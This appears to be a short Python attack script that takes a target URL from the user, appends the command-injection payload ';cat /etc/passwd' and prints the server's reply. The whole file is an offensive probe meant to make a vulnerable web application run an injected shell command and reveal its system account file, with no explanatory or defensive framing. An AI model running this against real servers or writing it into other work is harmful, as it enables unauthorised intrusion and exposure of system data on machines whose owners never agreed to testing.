import requests

url = input("URL: ")
payload = ";cat /etc/passwd"

response = requests.get(url + payload)
print(response.text)
